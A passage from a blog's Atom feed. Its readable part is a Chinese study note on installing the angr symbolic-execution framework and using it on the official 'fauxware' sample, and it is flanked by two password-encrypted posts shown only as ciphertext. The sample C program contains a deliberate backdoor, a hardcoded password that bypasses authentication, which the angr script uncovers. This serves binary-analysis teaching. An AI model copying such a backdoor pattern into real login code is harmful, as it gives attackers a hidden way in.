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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" 